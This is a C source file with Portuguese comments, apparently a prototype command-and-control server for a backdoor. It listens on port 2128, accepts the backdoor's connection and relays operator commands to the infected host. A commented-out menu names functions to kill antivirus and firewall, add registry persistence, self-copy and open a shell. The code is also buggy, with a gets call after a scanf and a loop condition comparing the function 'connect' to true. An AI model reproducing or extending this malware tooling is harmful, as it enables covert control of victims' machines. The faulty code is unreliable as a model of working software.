/* another prototype of server.

   this is more functional.

   anyway, just a taste. */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <fcntl.h>

#define porta 2128
#define bytes 1024

#define false 0
#define true 1

/*
void escolha()


{
  char option;
  int skt;
      switch(option)
      {

      case '1':
           send(skt,'auto_copy',NULL,NULL);
           break;
      case '2':
           copy_to_registry();
           return;
      case '3':
          kill_antivirus();
          return;
      case '4':
           kill_firewall();

      case '5':
           shell();
           default:

                  sleep(0.2);
                  return;

      }


} */
int main()

    {
        char mensagem[bytes];
        int buf, skt, tskt, escolha;
        struct sockaddr_in serv;

        system("clear || cls");

        /* setting up the connection */

        skt = socket(AF_INET, SOCK_STREAM, 0);
        serv.sin_family = AF_INET;
        serv.sin_addr.s_addr = INADDR_ANY;
        serv.sin_port = htons (porta);
        memset(&(serv.sin_zero),0x00,sizeof(serv.sin_zero));
        tskt = sizeof(struct sockaddr_in);

        {

        if (setsockopt(skt, SOL_SOCKET, SO_REUSEADDR, &(int){ 1 }, sizeof(int)) < 0)
            perror("setsockopt(SO_REUSEADDR)failed");
        }

        printf("\n ** Waiting backdoor connect in ** \n");

        /*SOCKET INICIALIZA LISTENER PARA OUVIR PORTA*/

        bind(skt,(struct sockaddr *)&serv,sizeof(struct sockaddr));
        listen(skt,1);
        printf("\n listening on port: %d\n\n",porta);

        /*recv connection */

        skt = accept(skt,(struct sockaddr *)&serv,&tskt);
        printf("\n connection with backdoor stabilished\n adress: %s\n\n",inet_ntoa(serv.sin_addr));

       /*send some data to backdoor */
       // strcpy(mensagem,bytes);
        //send(skt,mensagem,strlen(mensagem), 0);

        /*recv from backdoor*/
        //buf = recv(skt, mensagem,bytes, 0);
        //mensagem[buf]=0x00;
        //printf("\n%s\n",mensagem);


        /*loop between server and backdoor
        */
        do {

        //recebe
        buf = recv(skt,mensagem,bytes,0);
        mensagem[buf]=0x00;
        printf("%s\n",mensagem);

        /* SEND */
        fprintf(stdout,"send command to backdoor: ");
        scanf("%s",&mensagem);
        gets(mensagem);
        send(skt, mensagem, strlen(mensagem), 0);

        }

        while(connect != true);

        close(skt);
        printf(">> Connection finished....\n\n",inet_ntoa(serv.sin_addr));
        exit(EXIT_SUCCESS);

    }
